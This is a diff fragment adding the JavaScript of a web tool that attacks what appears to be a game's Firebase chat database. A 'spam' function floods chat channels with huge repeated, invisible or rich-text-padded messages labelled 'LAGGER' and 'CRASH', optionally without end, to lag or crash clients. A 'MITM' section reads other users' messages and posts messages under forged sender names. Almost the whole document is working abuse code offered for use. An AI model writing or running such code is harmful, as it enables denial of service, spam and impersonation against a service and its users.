+        async function sendPost(url, payload) {
+            try {
+                const r = await fetch(url, { method:'POST', headers:HEADERS, body:JSON.stringify(payload), mode:'cors' });
+                return r.status;
+            } catch(e) { return `ERR: ${e.message}`; }
+        }
+
+        async function startSpam() {
+            if (spamActive) return;
+            try {
+                const jobid   = document.getElementById('s-jobid').value.trim();
+                let   name    = document.getElementById('s-name').value.trim();
+                let   message = document.getElementById('s-message').value;
+                const repeat  = parseInt(document.getElementById('s-repeat').value) || 100;
+                const count   = parseInt(document.getElementById('s-count').value) || 0;
+                const infinite= document.getElementById('s-infiniteSpam').checked;
+                const invName = document.getElementById('s-invisibleName').checked;
+                const invMsg  = document.getElementById('s-invisibleMsg').checked;
+                const richName= document.getElementById('s-richTextName').checked;
+
+                if (!jobid) { showSpamStatus('JobID required', 'error'); return; }
+                if (!name) name = 'LAGGER';
+                if (!message) message = 'CRASH';
+
+                if (richName) name = richtextBig(name, 100);
+                if (invName)  name = invisible(name);
+
+                let content = message.repeat(repeat);
+                if (invMsg) content = invisible(content);
+
+                const url = `https://${PROJECT}.${REGION}.firebasedatabase.app/${jobid}.json?auth=${AUTH}`;
+                const payload = { sender: name, content: content, timestamp: Math.floor(Date.now()/1000), realName: name, DisplayName: name };
+                const payloadSize = JSON.stringify(payload).length;
+                spamLog(`Payload: ${payloadSize} bytes (${(payloadSize/1024).toFixed(1)} KB)`, 'info');
+
+                if (payloadSize > 500000 && !confirm(`Payload is ${(payloadSize/1024).toFixed(1)} KB (>500KB). Continue?`)) return;
+
+                spamActive = true;
+                spamStop   = false;
+                spamStats  = { ok:0, fail:0, total:0 };
+
+                document.getElementById('btnSpam').style.display = 'none';
+                document.getElementById('btnStop').style.display = 'block';
+                document.getElementById('s-logContainer').style.display = 'block';
+                showSpamStatus(infinite ? 'Spamming infinitely...' : `Spamming ${count>0?count+'x':'1x'}...`, 'info');
+
+                const maxCount = infinite ? Infinity : (count > 0 ? count : 1);
+
+                while (!spamStop && spamStats.total < maxCount) {
+                    const status = await sendPost(url, payload);
+                    spamStats.total++;
+                    if (typeof status === 'number' && status >= 200 && status < 300) {
+                        spamStats.ok++;
+                        spamLog(`[${spamStats.total}] OK ${status}`, 'ok');
+                    } else {
+                        spamStats.fail++;
+                        spamLog(`[${spamStats.total}] FAIL ${status}`, 'fail');
+                    }
+                    updateSpamStats();
+                    if (spamStats.total % 10 === 0) await new Promise(r => setTimeout(r, 10));
+                }
+
+                spamActive = false;
+                document.getElementById('btnSpam').style.display = 'block';
+                document.getElementById('btnStop').style.display = 'none';
+                showSpamStatus(`Done. OK: ${spamStats.ok} | Fail: ${spamStats.fail} | Total: ${spamStats.total}`, 'success');
+
+            } catch(e) {
+                showSpamStatus('Error: ' + e.message, 'error');
+                spamActive = false;
+                document.getElementById('btnSpam').style.display = 'block';
+                document.getElementById('btnStop').style.display = 'none';
+            }
+        }
+
+        function stopSpam() {
+            spamStop = true;
+            spamLog('Stopping...', 'info');
+        }
+
+        // ============== MITM LOGIC ==============
+        let mitmConnected  = false;
+        let mitmPolling    = false;
+        let mitmInterval   = null;
+        let mitmSeen       = new Set();
+        let mitmStats      = { in:0, out:0, total:0 };
+        let mitmBaseUrl    = "";
+
+        function showMITMStatus(msg, type) {
+            const s = document.getElementById('m-status');
+            s.textContent = msg;
+            s.className = `status active ${type}`;
+        }
+
+        function mitmTerm(msg, type = 'sys') {
+            const terminal = document.getElementById('m-terminal');
+            const line = document.createElement('div');
+            line.className = `log-entry ${type}`;
+            line.textContent = msg;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function clearMITMLog() {
+            document.getElementById('m-terminal').innerHTML = '';
+            mitmStats = { in:0, out:0, total:0 };
+            updateMITMStats();
+            mitmTerm('--- terminal cleared ---', 'sys');
+        }
+
+        function updateMITMStats() {
+            document.getElementById('m-statIn').textContent    = mitmStats.in;
+            document.getElementById('m-statOut').textContent   = mitmStats.out;
+            document.getElementById('m-statTotal').textContent = mitmStats.total;
+        }
+
+        function setConnState(state) {
+            const dot = document.getElementById('connDot');
+            dot.className = 'conn-dot';
+            dot.classList.remove('pulse');
+            if (state === 'online') dot.classList.add('online');
+            else if (state === 'polling') { dot.classList.add('polling', 'pulse'); }
+        }
+
+        function stripUTF8(str) {
+    return String(str).replace(/[^\x00-\x7F]/g, '');
+}
+
+async function fetchMessages() {
+            if (!mitmConnected) return;
+            try {
+                const response = await fetch(mitmBaseUrl, { method:'GET', headers:HEADERS, mode:'cors' });
+                if (!mitmConnected) return;
+                if (response.ok) {
+                    const data = await response.json();
+                    if (!data || typeof data !== 'object') { setConnState('online'); return; }
+                    const keys = Object.keys(data).sort();
+                    let newCount = 0;
+                    for (const key of keys) {
+                        if (mitmSeen.has(key)) continue;
+                        mitmSeen.add(key);
+                        const msg     = data[key];
+                        const sender  = msg.sender   || "UNKNOWN";
+                        const realName= msg.realName || sender;
+                        const content = msg.content  || "";
+                        const ts      = msg.timestamp || 0;
+                        const timeStr = ts ? new Date(ts*1000).toLocaleTimeString() : "--:--:--";
+                        mitmTerm(`[${timeStr}] ${stripUTF8(sender)} (${stripUTF8(realName)}): ${stripUTF8(content)}`, 'in');
+                        mitmStats.in++;
+                        mitmStats.total++;
+                        newCount++;
+                    }
+                    if (newCount > 0) updateMITMStats();
+                    setConnState('online');
+                } else {
+                    setConnState('polling');
+                    mitmTerm(`[ERR] HTTP ${response.status}`, 'fail');
+                }
+            } catch(e) {
+                if (!mitmConnected) return;
+                setConnState('polling');
+                mitmTerm(`[ERR] ${e.message}`, 'fail');
+            }
+        }
+
+        async function mitmSendMessage() {
+            if (!mitmConnected) { showMITMStatus("Not connected", "error"); return; }
+            const name    = document.getElementById('m-name').value.trim() || "LAGGER";
+            const message = document.getElementById('m-sendMessage').value;
+            if (!message.trim()) { showMITMStatus("Message empty", "warn"); return; }
+
+            const payload = { sender:name, content:message, timestamp:Math.floor(Date.now()/1000), realName:name, DisplayName:name };
+            try {
+                document.getElementById('btnSend').disabled = true;
+                const response = await fetch(mitmBaseUrl, { method:'POST', headers:HEADERS, body:JSON.stringify(payload), mode:'cors' });
+                if (response.ok) {
+                    const timeStr = new Date().toLocaleTimeString();
+                    mitmTerm(`[${timeStr}] ${stripUTF8(name)} (YOU): ${stripUTF8(message)}`, 'out');
+                    mitmStats.out++;
+                    mitmStats.total++;
+                    updateMITMStats();
+                    document.getElementById('m-sendMessage').value = '';
+                    document.getElementById('m-status').className = 'status';
+                } else {
+                    showMITMStatus(`Send failed: HTTP ${response.status}`, "error");
+                    mitmTerm(`[ERR] Send failed: HTTP ${response.status}`, 'fail');
+                }
+            } catch(e) {
+                showMITMStatus(`Send error: ${e.message}`, "error");
+                mitmTerm(`[ERR] Send error: ${e.message}`, 'fail');
+            } finally {
+                document.getElementById('btnSend').disabled = false;
+            }
+        }
+
+        function handleMITMEnter(e) {
+            if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); mitmSendMessage(); }
+        }
+
+        function startPolling() {
+            mitmPolling = true;
+            setConnState('polling');
+            fetchMessages();
+            mitmInterval = setInterval(() => { if (mitmConnected && mitmPolling) fetchMessages(); }, 1200);
+        }
+
+        function stopPolling() {
+            mitmPolling = false;
+            if (mitmInterval) { clearInterval(mitmInterval); mitmInterval = null; }
+            setConnState('');
+        }
+
+        async function toggleConnection() {
+            const btn = document.getElementById('btnConnect');
+            if (mitmConnected) {
+                mitmConnected = false;
+                stopPolling();
+                document.getElementById('m-terminalContainer').style.display = 'none';
+                document.getElementById('m-sendSection').style.display = 'none';
+                btn.textContent = 'Connect';
+                btn.className = 'btn btn-connect-mitm';
+                document.getElementById('m-jobid').disabled = false;
+                document.getElementById('m-name').disabled = false;
+                showMITMStatus("Disconnected", "warn");
+                mitmTerm("--- disconnected ---", "sys");
+                return;
+            }
+
+            const jobid = document.getElementById('m-jobid').value.trim();
+            const name  = document.getElementById('m-name').value.trim() || "LAGGER";
+            if (!jobid) { showMITMStatus("JobID required", "error"); return; }
+
+            mitmBaseUrl = `https://${PROJECT}.${REGION}.firebasedatabase.app/${jobid}.json?auth=${AUTH}`;
+            document.getElementById('m-jobid').disabled = true;
+            document.getElementById('m-name').disabled  = true;
+            btn.textContent = 'Disconnect';
+            btn.className = 'btn btn-connect-mitm disconnecting';
+
+            document.getElementById('m-terminalContainer').style.display = 'block';
+            document.getElementById('m-sendSection').style.display = 'block';
+            document.getElementById('m-terminal').innerHTML = '';
+
+            mitmConnected = true;
+            mitmSeen  = new Set();
+            mitmStats = { in:0, out:0, total:0 };
+            updateMITMStats();
+
+            mitmTerm(`[+] Connected to: ${jobid}`, 'sys');
+            mitmTerm(`[+] Name: ${name}`, 'sys');
+            mitmTerm(`[+] Format: sender (realName): content`, 'sys');
+            showMITMStatus("Connected — listening...", "success");
+            startPolling();
+        }
+    </script>
+</body>
+</html>
